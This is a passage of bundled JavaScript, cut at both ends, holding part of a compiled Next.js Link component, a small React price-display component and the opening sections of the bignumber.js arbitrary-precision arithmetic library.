		                throw new Error(`Multiple children were passed to <Link> with \`href\` of \`${hrefProp}\` but only one child is supported https://nextjs.org/docs/messages/link-multiple-children` + (typeof window !== 'undefined' ? " \nOpen your browser's console to view the Component stack trace." : ''));
		            }
		        } else {
		            child = _react.default.Children.only(children);
		        }
		    }
		    const childRef = legacyBehavior ? child && typeof child === 'object' && child.ref : forwardedRef;
		    const [setIntersectionRef, isVisible, resetVisible] = (_useIntersection).useIntersection({
		        rootMargin: '200px'
		    });
		    const setRef = _react.default.useCallback((el)=>{
		        // Before the link getting observed, check if visible state need to be reset
		        if (previousAs.current !== as || previousHref.current !== href) {
		            resetVisible();
		            previousAs.current = as;
		            previousHref.current = href;
		        }
		        setIntersectionRef(el);
		        if (childRef) {
		            if (typeof childRef === 'function') childRef(el);
		            else if (typeof childRef === 'object') {
		                childRef.current = el;
		            }
		        }
		    }, [
		        as,
		        childRef,
		        href,
		        resetVisible,
		        setIntersectionRef
		    ]);
		    _react.default.useEffect(()=>{
		        const shouldPrefetch = isVisible && p && (_router).isLocalURL(href);
		        const curLocale = typeof locale !== 'undefined' ? locale : router && router.locale;
		        const isPrefetched = prefetched[href + '%' + as + (curLocale ? '%' + curLocale : '')];
		        if (shouldPrefetch && !isPrefetched) {
		            prefetch(router, href, as, {
		                locale: curLocale
		            });
		        }
		    }, [
		        as,
		        href,
		        isVisible,
		        locale,
		        p,
		        router
		    ]);
		    const childProps = {
		        ref: setRef,
		        onClick: (e)=>{
		            if (process.env.NODE_ENV !== 'production') {
		                if (!e) {
		                    throw new Error(`Component rendered inside next/link has to pass click event to "onClick" prop.`);
		                }
		            }
		            if (!legacyBehavior && typeof onClick === 'function') {
		                onClick(e);
		            }
		            if (legacyBehavior && child.props && typeof child.props.onClick === 'function') {
		                child.props.onClick(e);
		            }
		            if (!e.defaultPrevented) {
		                linkClicked(e, router, href, as, replace, shallow, scroll, locale, Boolean(appRouter), p);
		            }
		        },
		        onMouseEnter: (e)=>{
		            if (!legacyBehavior && typeof onMouseEnter === 'function') {
		                onMouseEnter(e);
		            }
		            if (legacyBehavior && child.props && typeof child.props.onMouseEnter === 'function') {
		                child.props.onMouseEnter(e);
		            }
		            // Check for not prefetch disabled in page using appRouter
		            if (!(!p && appRouter)) {
		                if ((_router).isLocalURL(href)) {
		                    prefetch(router, href, as, {
		                        priority: true
		                    });
		                }
		            }
		        },
		        onTouchStart: (e)=>{
		            if (!legacyBehavior && typeof onTouchStart === 'function') {
		                onTouchStart(e);
		            }
		            if (legacyBehavior && child.props && typeof child.props.onTouchStart === 'function') {
		                child.props.onTouchStart(e);
		            }
		            // Check for not prefetch disabled in page using appRouter
		            if (!(!p && appRouter)) {
		                if ((_router).isLocalURL(href)) {
		                    prefetch(router, href, as, {
		                        priority: true
		                    });
		                }
		            }
		        }
		    };
		    // If child is an <a> tag and doesn't have a href attribute, or if the 'passHref' property is
		    // defined, we specify the current 'href', so that repetition is not needed by the user
		    if (!legacyBehavior || passHref || child.type === 'a' && !('href' in child.props)) {
		        const curLocale = typeof locale !== 'undefined' ? locale : router && router.locale;
		        // we only render domain locales if we are currently on a domain locale
		        // so that locale links are still visitable in development/preview envs
		        const localeDomain = router && router.isLocaleDomain && (_getDomainLocale).getDomainLocale(as, curLocale, router.locales, router.domainLocales);
		        childProps.href = localeDomain || (_addBasePath).addBasePath((_addLocale).addLocale(as, curLocale, router && router.defaultLocale));
		    }
		    return legacyBehavior ? /*#__PURE__*/ _react.default.cloneElement(child, childProps) : /*#__PURE__*/ _react.default.createElement("a", Object.assign({}, restProps, childProps), children);
		});
		var _default = Link;
		exports.default = _default;

		if ((typeof exports.default === 'function' || (typeof exports.default === 'object' && exports.default !== null)) && typeof exports.default.__esModule === 'undefined') {
		  Object.defineProperty(exports.default, '__esModule', { value: true });
		  Object.assign(exports.default, exports);
		  module.exports = exports.default;
		}

		
	} (link$1, link$1.exports));
	return link$1.exports;
}

var link;
var hasRequiredLink;

function requireLink () {
	if (hasRequiredLink) return link;
	hasRequiredLink = 1;
	link = requireLink$1();
	return link;
}

var linkExports = requireLink();
var Link = /*@__PURE__*/getDefaultExportFromCjs(linkExports);

var Price = function Price(_ref) {
  var coin = _ref.coin,
    amount = _ref.amount;
    _ref.currency;
  return /*#__PURE__*/React__default.createElement("div", {
    className: "flex flex-col items-end justify-end"
  }, /*#__PURE__*/React__default.createElement("p", {
    className: "text-xs text-gray-500 opacity-80"
  }, "Price"), /*#__PURE__*/React__default.createElement("div", {
    className: "flex items-center text-black"
  }, /*#__PURE__*/React__default.createElement(Icon, {
    type: coin,
    className: "mr-1.5"
  }), /*#__PURE__*/React__default.createElement("span", {
    className: "pr-3 text-xl"
  }, amount)));
};

/*
 *      bignumber.js v9.1.2
 *      A JavaScript library for arbitrary-precision arithmetic.
 *      https://github.com/MikeMcl/bignumber.js
 *      Copyright (c) 2022 Michael Mclaughlin <M8ch88l@gmail.com>
 *      MIT Licensed.
 *
 *      BigNumber.prototype methods     |  BigNumber methods
 *                                      |
 *      absoluteValue            abs    |  clone
 *      comparedTo                      |  config               set
 *      decimalPlaces            dp     |      DECIMAL_PLACES
 *      dividedBy                div    |      ROUNDING_MODE
 *      dividedToIntegerBy       idiv   |      EXPONENTIAL_AT
 *      exponentiatedBy          pow    |      RANGE
 *      integerValue                    |      CRYPTO
 *      isEqualTo                eq     |      MODULO_MODE
 *      isFinite                        |      POW_PRECISION
 *      isGreaterThan            gt     |      FORMAT
 *      isGreaterThanOrEqualTo   gte    |      ALPHABET
 *      isInteger                       |  isBigNumber
 *      isLessThan               lt     |  maximum              max
 *      isLessThanOrEqualTo      lte    |  minimum              min
 *      isNaN                           |  random
 *      isNegative                      |  sum
 *      isPositive                      |
 *      isZero                          |
 *      minus                           |
 *      modulo                   mod    |
 *      multipliedBy             times  |
 *      negated                         |
 *      plus                            |
 *      precision                sd     |
 *      shiftedBy                       |
 *      squareRoot               sqrt   |
 *      toExponential                   |
 *      toFixed                         |
 *      toFormat                        |
 *      toFraction                      |
 *      toJSON                          |
 *      toNumber                        |
 *      toPrecision                     |
 *      toString                        |
 *      valueOf                         |
 *
 */


var
  isNumeric = /^-?(?:\d+(?:\.\d*)?|\.\d+)(?:e[+-]?\d+)?$/i,
  mathceil = Math.ceil,
  mathfloor = Math.floor,

  bignumberError = '[BigNumber Error] ',
  tooManyDigits = bignumberError + 'Number primitive has more than 15 significant digits: ',

  BASE = 1e14,
  LOG_BASE = 14,
  MAX_SAFE_INTEGER = 0x1fffffffffffff,         // 2^53 - 1
  // MAX_INT32 = 0x7fffffff,                   // 2^31 - 1
  POWS_TEN = [1, 10, 100, 1e3, 1e4, 1e5, 1e6, 1e7, 1e8, 1e9, 1e10, 1e11, 1e12, 1e13],
  SQRT_BASE = 1e7,

  // EDITABLE
  // The limit on the value of DECIMAL_PLACES, TO_EXP_NEG, TO_EXP_POS, MIN_EXP, MAX_EXP, and
  // the arguments to toExponential, toFixed, toFormat, and toPrecision.
  MAX = 1E9;                                   // 0 to MAX_INT32


/*
 * Create and return a BigNumber constructor.
 */
function clone(configObject) {
  var div, convertBase, parseNumeric,
    P = BigNumber.prototype = { constructor: BigNumber, toString: null, valueOf: null },
    ONE = new BigNumber(1),


    //----------------------------- EDITABLE CONFIG DEFAULTS -------------------------------


    // The default values below must be integers within the inclusive ranges stated.
    // The values can also be changed at run-time using BigNumber.set.

    // The maximum number of decimal places for operations involving division.
    DECIMAL_PLACES = 20,                     // 0 to MAX

    // The rounding mode used when rounding to the above decimal places, and when using
    // toExponential, toFixed, toFormat and toPrecision, and round (default value).
    // UP         0 Away from zero.
    // DOWN       1 Towards zero.
    // CEIL       2 Towards +Infinity.
    // FLOOR      3 Towards -Infinity.
    // HALF_UP    4 Towards nearest neighbour. If equidistant, up.
    // HALF_DOWN  5 Towards nearest neighbour. If equidistant, down.
    // HALF_EVEN  6 Towards nearest neighbour. If equidistant, towards even neighbour.
    // HALF_CEIL  7 Towards nearest neighbour. If equidistant, towards +Infinity.
    // HALF_FLOOR 8 Towards nearest neighbour. If equidistant, towards -Infinity.
    ROUNDING_MODE = 4,                       // 0 to 8

    // EXPONENTIAL_AT : [TO_EXP_NEG , TO_EXP_POS]

    // The exponent value at and beneath which toString returns exponential notation.
    // Number type: -7
    TO_EXP_NEG = -7,                         // 0 to -MAX

    // The exponent value at and above which toString returns exponential notation.
    // Number type: 21
    TO_EXP_POS = 21,                         // 0 to MAX

    // RANGE : [MIN_EXP, MAX_EXP]

    // The minimum exponent value, beneath which underflow to zero occurs.
    // Number type: -324  (5e-324)
    MIN_EXP = -1e7,                          // -1 to -MAX

    // The maximum exponent value, above which overflow to Infinity occurs.
    // Number type:  308  (1.7976931348623157e+308)
    // For MAX_EXP > 1e7, e.g. new BigNumber('1e100000000').plus(1) may be slow.
    MAX_EXP = 1e7,                           // 1 to MAX

    // Whether to use cryptographically-secure random number generation, if available.
    CRYPTO = false,                          // true or false

    // The modulo mode used when calculating the modulus: a mod n.
    // The quotient (q = a / n) is calculated according to the corresponding rounding mode.
    // The remainder (r) is calculated as: r = a - n * q.
    //
    // UP        0 The remainder is positive if the dividend is negative, else is negative.
    // DOWN      1 The remainder has the same sign as the dividend.
    //             This modulo mode is commonly known as 'truncated division' and is
    //             equivalent to (a % n) in JavaScript.
    // FLOOR     3 The remainder has the same sign as the divisor (Python %).
    // HALF_EVEN 6 This modulo mode implements the IEEE 754 remainder function.
    // EUCLID    9 Euclidian division. q = sign(n) * floor(a / abs(n)).
    //             The remainder is always positive.
    //
    // The truncated division, floored division, Euclidian division and IEEE 754 remainder
    // modes are commonly used for the modulus operation.
    // Although the other rounding modes can also be used, they may not give useful results.
    MODULO_MODE = 1,                         // 0 to 9

    // The maximum number of significant digits of the result of the exponentiatedBy operation.
    // If POW_PRECISION is 0, there will be unlimited significant digits.
    POW_PRECISION = 0,                       // 0 to MAX

    // The format specification used by the BigNumber.prototype.toFormat method.
    FORMAT = {
      prefix: '',
      groupSize: 3,
      secondaryGroupSize: 0,
      groupSeparator: ',',
      decimalSeparator: '.',
      fractionGroupSize: 0,
      fractionGroupSeparator: '\xA0',        // non-breaking space
      suffix: ''
    },

    // The alphabet used for base conversion. It must be at least 2 characters long, with no '+',
    // '-', '.', whitespace, or repeated character.
    // '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ$_'
    ALPHABET = '0123456789abcdefghijklmnopqrstuvwxyz',
    alphabetHasNormalDecimalDigits = true;


  //------------------------------------------------------------------------------------------


  // CONSTRUCTOR


  /*
   * The BigNumber constructor and exported function.
   * Create and return a new instance of a BigNumber object.
   *
   * v {number|string|BigNumber} A numeric value.
   * [b] {number} The base of v. Integer, 2 to ALPHABET.length inclusive.
   */
  function BigNumber(v, b) {
    var alphabet, c, caseChanged, e, i, isNum, len, str,
      x = this;

    // Enable constructor call without `new`.
    if (!(x instanceof BigNumber)) return new BigNumber(v, b);

    if (b == null) {

      if (v && v._isBigNumber === true) {
        x.s = v.s;

        if (!v.c || v.e > MAX_EXP) {
          x.c = x.e = null;
        } else if (v.e < MIN_EXP) {
          x.c = [x.e = 0];
        } else {
          x.e = v.e;
          x.c = v.c.slice();
        }

        return;
      }

      if ((isNum = typeof v == 'number') && v * 0 == 0) {

        // Use `1 / n` to handle minus zero also.
        x.s = 1 / v < 0 ? (v = -v, -1) : 1;

        // Fast path for integers, where n < 2147483648 (2**31).
        if (v === ~~v) {
          for (e = 0, i = v; i >= 10; i /= 10, e++);

          if (e > MAX_EXP) {
            x.c = x.e = null;
          } else {
            x.e = e;
            x.c = [v];
          }

          return;
        }

        str = String(v);
      } else {

        if (!isNumeric.test(str = String(v))) return parseNumeric(x, str, isNum);

        x.s = str.charCodeAt(0) == 45 ? (str = str.slice(1), -1) : 1;
      }

      // Decimal point?
      if ((e = str.indexOf('.')) > -1) str = str.replace('.', '');

      // Exponential form?
      if ((i = str.search(/e/i)) > 0) {

        // Determine exponent.
        if (e < 0) e = i;
        e += +str.slice(i + 1);
        str = str.substring(0, i);
      } else if (e < 0) {

        // Integer.
        e = str.length;
      }

    } else {

      // '[BigNumber Error] Base {not a primitive number|not an integer|out of range}: {b}'
      intCheck(b, 2, ALPHABET.length, 'Base');

      // Allow exponential notation to be used with base 10 argument, while
      // also rounding to DECIMAL_PLACES as with other bases.
      if (b == 10 && alphabetHasNormalDecimalDigits) {
        x = new BigNumber(v);
        return round(x, DECIMAL_PLACES + x.e + 1, ROUNDING_MODE);
      }

      str = String(v);

      if (isNum = typeof v == 'number') {

        // Avoid potential interpretation of Infinity and NaN as base 44+ values.
        if (v * 0 != 0) return parseNumeric(x, str, isNum, b);

        x.s = 1 / v < 0 ? (str = str.slice(1), -1) : 1;

        // '[BigNumber Error] Number primitive has more than 15 significant digits: {n}'
        if (BigNumber.DEBUG && str.replace(/^0\.0*|\./, '').length > 15) {
          throw Error
           (tooManyDigits + v);
        }
      } else {
        x.s = str.charCodeAt(0) === 45 ? (str = str.slice(1), -1) : 1;
      }

      alphabet = ALPHABET.slice(0, b);
      e = i = 0;

      // Check that str is a valid base b number.
      // Don't use RegExp, so alphabet can contain special characters.
      for (len = str.length; i < len; i++) {
        if (alphabet.indexOf(c = str.charAt(i)) < 0) {
          if (c == '.') {

            // If '.' is not the first character and it has not be found before.
            if (i > e) {
              e = len;
              continue;
            }
          } else if (!caseChanged) {

            // Allow e.g. hexadecimal 'FF' as well as 'ff'.
            if (str == str.toUpperCase() && (str = str.toLowerCase()) ||
                str == str.toLowerCase() && (str = str.toUpperCase())) {
              caseChanged = true;
              i = -1;
              e = 0;
              continue;
            }
          }

          return parseNumeric(x, String(v), isNum, b);
        }
      }

      // Prevent later check for length on converted number.
      isNum = false;
      str = convertBase(str, b, 10, x.s);

      // Decimal point?
      if ((e = str.indexOf('.')) > -1) str = str.replace('.', '');
      else e = str.length;
    }

    // Determine leading zeros.
    for (i = 0; str.charCodeAt(i) === 48; i++);

    // Determine trailing zeros.
    for (len = str.length; str.charCodeAt(--len) === 48;);

    if (str = str.slice(i, ++len)) {
      len -= i;

      // '[BigNumber Error] Number primitive has more than 15 significant digits: {n}'
      if (isNum && BigNumber.DEBUG &&
        len > 15 && (v > MAX_SAFE_INTEGER || v !== mathfloor(v))) {
          throw Error
           (tooManyDigits + (x.s * v));
      }

       // Overflow?
      if ((e = e - i - 1) > MAX_EXP) {

        // Infinity.
        x.c = x.e = null;

      // Underflow?
      } else if (e < MIN_EXP) {

        // Zero.
        x.c = [x.e = 0];
      } else {
        x.e = e;
        x.c = [];

        // Transform base

        // e is the base 10 exponent.
        // i is where to slice str to get the first element of the coefficient array.
        i = (e + 1) % LOG_BASE;
        if (e < 0) i += LOG_BASE;  // i < 1

        if (i < len) {
          if (i) x.c.push(+str.slice(0, i));

          for (len -= LOG_BASE; i < len;) {
            x.c.push(+str.slice(i, i += LOG_BASE));
          }

          i = LOG_BASE - (str = str.slice(i)).length;
        } else {
          i -= len;
        }

        for (; i--; str += '0');
        x.c.push(+str);
      }
    } else {

      // Zero.
      x.c = [x.e = 0];
    }
  }


  // CONSTRUCTOR PROPERTIES


  BigNumber.clone = clone;

  BigNumber.ROUND_UP = 0;
  BigNumber.ROUND_DOWN = 1;
  BigNumber.ROUND_CEIL = 2;
  BigNumber.ROUND_FLOOR = 3;
  BigNumber.ROUND_HALF_UP = 4;
  BigNumber.ROUND_HALF_DOWN = 5;
  BigNumber.ROUND_HALF_EVEN = 6;
  BigNumber.ROUND_HALF_CEIL = 7;
  BigNumber.ROUND_HALF_FLOOR = 8;
  BigNumber.EUCLID = 9;


  /*
   * Configure infrequently-changing library-wide settings.
   *
   * Accept an object with the following optional properties (if the value of a property is
   * a number, it must be an integer within the inclusive range stated):
   *
   *   DECIMAL_PLACES   {number}           0 to MAX
   *   ROUNDING_MODE    {number}           0 to 8
   *   EXPONENTIAL_AT   {number|number[]}  -MAX to MAX  or  [-MAX to 0, 0 to MAX]
   *   RANGE            {number|number[]}  -MAX to MAX (not zero)  or  [-MAX to -1, 1 to MAX]
   *   CRYPTO           {boolean}          true or false
   *   MODULO_MODE      {number}           0 to 9
   *   POW_PRECISION       {number}           0 to MAX
   *   ALPHABET         {string}           A string of two or more unique characters which does
   *                                       not contain '.'.
   *   FORMAT           {object}           An object with some of the following properties:
   *     prefix                 {string}
   *     groupSize              {number}
   *     secondaryGroupSize     {number}
   *     groupSeparator         {string}
   *     decimalSeparator       {string}
   *     fractionGroupSize      {number}
   *     fractionGroupSeparator {string}
   *     suffix                 {string}
   *
   * (The values assigned to the above FORMAT object properties are not checked for validity.)
   *
   * E.g.
   * BigNumber.config({ DECIMAL_PLACES : 20, ROUNDING_MODE : 4 })
   *
   * Ignore properties/parameters set to null or undefined, except for ALPHABET.
   *
   * Return an object with the properties current values.
   */
  BigNumber.config = BigNumber.set = function (obj) {
    var p, v;

    if (obj != null) {

      if (typeof obj == 'object') {

        // DECIMAL_PLACES {number} Integer, 0 to MAX inclusive.
        // '[BigNumber Error] DECIMAL_PLACES {not a primitive number|not an integer|out of range}: {v}'
        if (obj.hasOwnProperty(p = 'DECIMAL_PLACES')) {
          v = obj[p];
          intCheck(v, 0, MAX, p);
          DECIMAL_PLACES = v;
        }

        // ROUNDING_MODE {number} Integer, 0 to 8 inclusive.
        // '[BigNumber Error] ROUNDING_MODE {not a primitive number|not an integer|out of range}: {v}'
        if (obj.hasOwnProperty(p = 'ROUNDING_MODE')) {
          v = obj[p];
          intCheck(v, 0, 8, p);
          ROUNDING_MODE = v;
        }

        // EXPONENTIAL_AT {number|number[]}
        // Integer, -MAX to MAX inclusive or
        // [integer -MAX to 0 inclusive, 0 to MAX inclusive].
        // '[BigNumber Error] EXPONENTIAL_AT {not a primitive number|not an integer|out of range}: {v}'
        if (obj.hasOwnProperty(p = 'EXPONENTIAL_AT')) {
          v = obj[p];
          if (v && v.pop) {
            intCheck(v[0], -1e9, 0, p);
            intCheck(v[1], 0, MAX, p);
            TO_EXP_NEG = v[0];
            TO_EXP_POS = v[1];
          } else {
            intCheck(v, -1e9, MAX, p);
            TO_EXP_NEG = -(TO_EXP_POS = v < 0 ? -v : v);
          }
        }

        // RANGE {number|number[]} Non-zero integer, -MAX to MAX inclusive or
        // [integer -MAX to -1 inclusive, integer 1 to MAX inclusive].
        // '[BigNumber Error] RANGE {not a primitive number|not an integer|out of range|cannot be zero}: {v}'
        if (obj.hasOwnProperty(p = 'RANGE')) {
          v = obj[p];
          if (v && v.pop) {
            intCheck(v[0], -1e9, -1, p);
            intCheck(v[1], 1, MAX, p);
            MIN_EXP = v[0];
            MAX_EXP = v[1];
          } else {
            intCheck(v, -1e9, MAX, p);
            if (v) {
              MIN_EXP = -(MAX_EXP = v < 0 ? -v : v);
            } else {
              throw Error
               (bignumberError + p + ' cannot be zero: ' + v);
            }
          }
        }

        // CRYPTO {boolean} true or false.
        // '[BigNumber Error] CRYPTO not true or false: {v}'
        // '[BigNumber Error] crypto unavailable'
        if (obj.hasOwnProperty(p = 'CRYPTO')) {
          v = obj[p];
          if (v === !!v) {
            if (v) {
              if (typeof crypto != 'undefined' && crypto &&
               (crypto.getRandomValues || crypto.randomBytes)) {
                CRYPTO = v;
              } else {
                CRYPTO = !v;
                throw Error
                 (bignumberError + 'crypto unavailable');
              }
            } else {
              CRYPTO = v;
            }
          } else {
            throw Error
             (bignumberError + p + ' not true or false: ' + v);
          }
        }

        // MODULO_MODE {number} Integer, 0 to 9 inclusive.
        // '[BigNumber Error] MODULO_MODE {not a primitive number|not an integer|out of range}: {v}'
        if (obj.hasOwnProperty(p = 'MODULO_MODE')) {
          v = obj[p];
          intCheck(v, 0, 9, p);
          MODULO_MODE = v;
        }

        // POW_PRECISION {number} Integer, 0 to MAX inclusive.
        // '[BigNumber Error] POW_PRECISION {not a primitive number|not an integer|out of range}: {v}'
        if (obj.hasOwnProperty(p = 'POW_PRECISION')) {
          v = obj[p];
          intCheck(v, 0, MAX, p);
          POW_PRECISION = v;
        }

        // FORMAT {object}
        // '[BigNumber Error] FORMAT not an object: {v}'
        if (obj.hasOwnProperty(p = 'FORMAT')) {
          v = obj[p];
          if (typeof v == 'object') FORMAT = v;
          else throw Error
           (bignumberError + p + ' not an object: ' + v);
        }

        // ALPHABET {string}
        // '[BigNumber Error] ALPHABET invalid: {v}'
        if (obj.hasOwnProperty(p = 'ALPHABET')) {
          v = obj[p];

          // Disallow if less than two characters,
          // or if it contains '+', '-', '.', whitespace, or a repeated character.
          if (typeof v == 'string' && !/^.?$|[+\-.\s]|(.).*\1/.test(v)) {
            alphabetHasNormalDecimalDigits = v.slice(0, 10) == '0123456789';
            ALPHABET = v;
          } else {
            throw Error
             (bignumberError + p + ' invalid: ' + v);
          }
        }

      } else {

        // '[BigNumber Error] Object expected: {v}'
        throw Error
         (bignumberError + 'Object expected: ' + obj);
      }
    }

    return {
      DECIMAL_PLACES: DECIMAL_PLACES,
      ROUNDING_MODE: ROUNDING_MODE,
      EXPONENTIAL_AT: [TO_EXP_NEG, TO_EXP_POS],
      RANGE: [MIN_EXP, MAX_EXP],
      CRYPTO: CRYPTO,
      MODULO_MODE: MODULO_MODE,
      POW_PRECISION: POW_PRECISION,
      FORMAT: FORMAT,
      ALPHABET: ALPHABET
    };
  };


  /*
   * Return true if v is a BigNumber instance, otherwise return false.
   *
   * If BigNumber.DEBUG is true, throw if a BigNumber instance is not well-formed.
   *
   * v {any}
   *
   * '[BigNumber Error] Invalid BigNumber: {v}'
   */
  BigNumber.isBigNumber = function (v) {
    if (!v || v._isBigNumber !== true) return false;
    if (!BigNumber.DEBUG) return true;

    var i, n,
      c = v.c,
      e = v.e,
      s = v.s;

    out: if ({}.toString.call(c) == '[object Array]') {

      if ((s === 1 || s === -1) && e >= -1e9 && e <= MAX && e === mathfloor(e)) {

        // If the first element is zero, the BigNumber value must be zero.
        if (c[0] === 0) {
          if (e === 0 && c.length === 1) return true;
          break out;
        }

        // Calculate number of digits that c[0] should have, based on the exponent.
        i = (e + 1) % LOG_BASE;
        if (i < 1) i += LOG_BASE;

        // Calculate number of digits of c[0].
        //if (Math.ceil(Math.log(c[0] + 1) / Math.LN10) == i) {
        if (String(c[0]).length == i) {

          for (i = 0; i < c.length; i++) {
            n = c[i];
            if (n < 0 || n >= BASE || n !== mathfloor(n)) break out;
          }

          // Last element cannot be zero, unless it is the only element.
          if (n !== 0) return true;
        }
      }

    // Infinity/NaN
    } else if (c === null && e === null && (s === null || s === 1 || s === -1)) {
      return true;
    }

    throw Error
      (bignumberError + 'Invalid BigNumber: ' + v);
  };


  /*
   * Return a new BigNumber whose value is the maximum of the arguments.
   *
   * arguments {number|string|BigNumber}
   */
  BigNumber.maximum = BigNumber.max = function () {
    return maxOrMin(arguments, -1);
  };


  /*
   * Return a new BigNumber whose value is the minimum of the arguments.
   *
   * arguments {number|string|BigNumber}
   */
  BigNumber.minimum = BigNumber.min = function () {
    return maxOrMin(arguments, 1);
  };


  /*
   * Return a new BigNumber with a random value equal to or greater than 0 and less than 1,
   * and with dp, or DECIMAL_PLACES if dp is omitted, decimal places (or less if trailing
   * zeros are produced).
   *
   * [dp] {number} Decimal places. Integer, 0 to MAX inclusive.
   *
   * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {dp}'
   * '[BigNumber Error] crypto unavailable'
   */
  BigNumber.random = (function () {
    var pow2_53 = 0x20000000000000;

    // Return a 53 bit integer n, where 0 <= n < 9007199254740992.
    // Check if Math.random() produces more than 32 bits of randomness.
    // If it does, assume at least 53 bits are produced, otherwise assume at least 30 bits.
    // 0x40000000 is 2^30, 0x800000 is 2^23, 0x1fffff is 2^21 - 1.
    var random53bitInt = (Math.random() * pow2_53) & 0x1fffff
     ? function () { return mathfloor(Math.random() * pow2_53); }
     : function () { return ((Math.random() * 0x40000000 | 0) * 0x800000) +
       (Math.random() * 0x800000 | 0); };

    return function (dp) {
      var a, b, e, k, v,
        i = 0,
        c = [],
        rand = new BigNumber(ONE);

      if (dp == null) dp = DECIMAL_PLACES;
      else intCheck(dp, 0, MAX);

      k = mathceil(dp / LOG_BASE);

      if (CRYPTO) {

        // Browsers supporting crypto.getRandomValues.
        if (crypto.getRandomValues) {

          a = crypto.getRandomValues(new Uint32Array(k *= 2));

          for (; i < k;) {

            // 53 bits:
            // ((Math.pow(2, 32) - 1) * Math.pow(2, 21)).toString(2)
            // 11111 11111111 11111111 11111111 11100000 00000000 00000000
            // ((Math.pow(2, 32) - 1) >>> 11).toString(2)
            //                                     11111 11111111 11111111
            // 0x20000 is 2^21.
            v = a[i] * 0x20000 + (a[i + 1] >>> 11);

            // Rejection sampling:
            // 0 <= v < 9007199254740992
            // Probability that v >= 9e15, is
            // 7199254740992 / 9007199254740992 ~= 0.0008, i.e. 1 in 1251
            if (v >= 9e15) {
              b = crypto.getRandomValues(new Uint32Array(2));
              a[i] = b[0];
              a[i + 1] = b[1];
            } else {

              // 0 <= v <= 8999999999999999
              // 0 <= (v % 1e14) <= 99999999999999
              c.push(v % 1e14);
              i += 2;
            }
          }
          i = k / 2;

        // Node.js supporting crypto.randomBytes.
        } else if (crypto.randomBytes) {

          // buffer
          a = crypto.randomBytes(k *= 7);

          for (; i < k;) {

            // 0x1000000000000 is 2^48, 0x10000000000 is 2^40
            // 0x100000000 is 2^32, 0x1000000 is 2^24
            // 11111 11111111 11111111 11111111 11111111 11111111 11111111
            // 0 <= v < 9007199254740992
            v = ((a[i] & 31) * 0x1000000000000) + (a[i + 1] * 0x10000000000) +
               (a[i + 2] * 0x100000000) + (a[i + 3] * 0x1000000) +
               (a[i + 4] << 16) + (a[i + 5] << 8) + a[i + 6];

            if (v >= 9e15) {
              crypto.randomBytes(7).copy(a, i);
            } else {

              // 0 <= (v % 1e14) <= 99999999999999
              c.push(v % 1e14);
              i += 7;
            }
          }
          i = k / 7;
        } else {
          CRYPTO = false;
          throw Error
           (bignumberError + 'crypto unavailable');
        }
      }

      // Use Math.random.
      if (!CRYPTO) {

        for (; i < k;) {
          v = random53bitInt();
          if (v < 9e15) c[i++] = v % 1e14;
        }
      }

      k = c[--i];
      dp %= LOG_BASE;

      // Convert trailing digits to zeros according to dp.
      if (k && dp) {
        v = POWS_TEN[LOG_BASE - dp];
        c[i] = mathfloor(k / v) * v;
      }

      // Remove trailing elements which are zero.
      for (; c[i] === 0; c.pop(), i--);

      // Zero?
      if (i < 0) {
        c = [e = 0];
      } else {

        // Remove leading elements which are zero and adjust exponent accordingly.
        for (e = -1 ; c[0] === 0; c.splice(0, 1), e -= LOG_BASE);

        // Count the digits of the first element of c to determine leading zeros, and...
        for (i = 1, v = c[0]; v >= 10; v /= 10, i++);

        // adjust the exponent accordingly.
        if (i < LOG_BASE) e -= LOG_BASE - i;
      }

      rand.e = e;
      rand.c = c;
      return rand;
    };
  })();


   /*
   * Return a BigNumber whose value is the sum of the arguments.
   *
   * arguments {number|string|BigNumber}
   */
  BigNumber.sum = function () {
    var i = 1,
      args = arguments,
      sum = new BigNumber(args[0]);
    for (; i < args.length;) sum = sum.plus(args[i++]);
    return sum;
  };


  // PRIVATE FUNCTIONS


  // Called by BigNumber and BigNumber.prototype.toString.
  convertBase = (function () {
    var decimal = '0123456789';

    /*
     * Convert string of baseIn to an array of numbers of baseOut.
     * Eg. toBaseOut('255', 10, 16) returns [15, 15].
     * Eg. toBaseOut('ff', 16, 10) returns [2, 5, 5].
     */
    function toBaseOut(str, baseIn, baseOut, alphabet) {
      var j,
        arr = [0],
        arrL,
        i = 0,
        len = str.length;

      for (; i < len;) {
        for (arrL = arr.length; arrL--; arr[arrL] *= baseIn);

        arr[0] += alphabet.indexOf(str.charAt(i++));

        for (j = 0; j < arr.length; j++) {

          if (arr[j] > baseOut - 1) {
            if (arr[j + 1] == null) arr[j + 1] = 0;
            arr[j + 1] += arr[j] / baseOut | 0;
            arr[j] %= baseOut;
          }
        }
      }

      return arr.reverse();
    }

    // Convert a numeric string of baseIn to a numeric string of baseOut.
    // If the caller is toString, we are converting from base 10 to baseOut.
    // If the caller is BigNumber, we are converting from baseIn to base 10.
    return function (str, baseIn, baseOut, sign, callerIsToString) {
      var alphabet, d, e, k, r, x, xc, y,
        i = str.indexOf('.'),
        dp = DECIMAL_PLACES,
        rm = ROUNDING_MODE;

      // Non-integer.
      if (i >= 0) {
        k = POW_PRECISION;

        // Unlimited precision.
        POW_PRECISION = 0;
        str = str.replace('.', '');
        y = new BigNumber(baseIn);
        x = y.pow(str.length - i);
        POW_PRECISION = k;

        // Convert str as if an integer, then restore the fraction part by dividing the
        // result by its base raised to a power.

        y.c = toBaseOut(toFixedPoint(coeffToString(x.c), x.e, '0'),
         10, baseOut, decimal);
        y.e = y.c.length;
      }

      // Convert the number as integer.

      xc = toBaseOut(str, baseIn, baseOut, callerIsToString
       ? (alphabet = ALPHABET, decimal)
       : (alphabet = decimal, ALPHABET));

      // xc now represents str as an integer and converted to baseOut. e is the exponent.
      e = k = xc.length;

      // Remove trailing zeros.
      for (; xc[--k] == 0; xc.pop());

      // Zero?
      if (!xc[0]) return alphabet.charAt(0);

      // Does str represent an integer? If so, no need for the division.
      if (i < 0) {
        --e;
      } else {
        x.c = xc;
        x.e = e;

        // The sign is needed for correct rounding.
        x.s = sign;
        x = div(x, y, dp, rm, baseOut);
        xc = x.c;
        r = x.r;
        e = x.e;
      }

      // xc now represents str converted to baseOut.

      // THe index of the rounding digit.
      d = e + dp + 1;

      // The rounding digit: the digit to the right of the digit that may be rounded up.
      i = xc[d];

      // Look at the rounding digits and mode to determine whether to round up.

      k = baseOut / 2;
      r = r || d < 0 || xc[d + 1] != null;

      r = rm < 4 ? (i != null || r) && (rm == 0 || rm == (x.s < 0 ? 3 : 2))
